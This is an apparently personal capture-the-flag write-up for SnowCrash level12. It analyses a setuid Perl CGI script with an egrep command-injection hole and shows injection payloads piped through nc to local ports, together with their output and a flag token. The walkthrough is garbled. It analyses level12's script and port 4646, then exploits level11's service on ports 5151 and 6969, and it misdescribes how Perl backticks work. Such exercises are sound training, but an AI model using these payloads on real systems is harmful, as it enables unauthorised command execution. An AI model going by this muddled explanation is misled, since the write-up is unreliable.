# Okay lets see what we have by doing a ls -la

level12@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl

# Lets see what happens when running the file

level12@SnowCrash:~$ ./level12.pl
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_CTYPE = "UTF-8",
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
Content-type: text/html


# Lets see whats in level12.pl

level11@SnowCrash:~$ vim level12.pl

  1 #!/usr/bin/env perl
  2 # localhost:4646
  3 use CGI qw{param};
  4 print "Content-type: text/html\n\n";
  5
  6 sub t {
  7   $nn = $_[1];
  8   $xx = $_[0];
  9   $xx =~ tr/a-z/A-Z/;
 10   $xx =~ s/\s.*//;
 11   @output = `egrep "^$xx" /tmp/xd 2>&1`;
 12   foreach $line (@output) {
 13       ($f, $s) = split(/:/, $line);
 14       if($s =~ $nn) {
 15           return 1;
 16       }
 17   }
 18   return 0;
 19 }
 20
 21 sub n {
 22   if($_[0] == 1) {
 23       print("..");
 24   } else {
 25       print(".");
 26   }
 27 }
 28
 29 n(t(param("x"), param("y")));

# Rememeber we have the find command. Lets give it a go and see what we find, 
level12@SnowCrash:~$ find / -iname "level12" 2>/dev/null | grep -v 'proc'
/var/www/level12
/rofs/var/www/level12

# We see a few important things in the file.
	We see on line 2 we have some important information 
		# localhost:4646
#	We also see that it will funtion in line 11 on line 12 of the program  
		@output = `egrep "^$xx" /tmp/xd 2>&1`;
	The above line will use @output which 
	Starts program prog in a separated process and returns a file handle that you can use to read data from this program 
	(if mode is "r", the default) or to write data to this program (if mode is "w"). 

# Lets see if we can exploit it with echo and using nc with our port 5151  and give us the password too and 6969 only gives the flag
#	Note localhost 5151 is home in networking
echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe

level11@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
Password: Erf nope..
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

level11@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 6969 && cat /tmp/Gabe
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

# Below is another method for solving the same problem.
level11@SnowCrash:~$ echo '; getflag | wall' | nc localhost 5151

Broadcast Message from flag11@Snow
        (somewhere) at 9:14 ...

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

Erf nope..

# We completely by passed the flag here and got it without cracking it but through an echo exploit that I used in 10 and it wasn't the correct.
	But it worked for this level11 


Resources
https://learn.perl.org/docs/keywords.html
http://perldoc.perl.org/perlvar.html
